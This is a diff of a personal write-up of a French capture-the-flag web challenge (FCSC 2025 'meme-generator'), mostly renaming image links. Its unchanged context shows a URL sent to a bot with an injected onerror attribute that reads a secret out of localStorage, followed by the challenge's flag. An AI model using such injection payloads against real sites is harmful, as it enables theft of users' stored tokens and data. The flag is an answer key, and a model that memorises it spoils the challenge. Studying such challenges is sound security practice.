@@ -1,8 +1,10 @@
-![[Pasted image 20251220192704.png]]
+https://hackropole.fr/fr/challenges/web/fcsc2025-web-meme-generator/
 
-![[Pasted image 20251220192739.png]]
+![[IMG-20251226151127767.png]]
 
-![[Pasted image 20251220193225.png]]
+![[IMG-20251226151127839.png]]
+
+![[IMG-20251226151127867.png]]
 
 PAYLOAD:
 ```php
@@ -24,7 +26,7 @@ URL à envoyer au bot:
 http://meme-generator/?image=x%22%20onerror%3D%22console.log(localStorage.getItem('flag'))%22&text=ok
 ```
 
-![[Pasted image 20251221123735.png]]
+![[IMG-20251226151127913.png]]
 
 ```
 FCSC{7ceb95bed1244c477d15967098cb71ec98e98678c2f2375de098e5919dba0bd8}
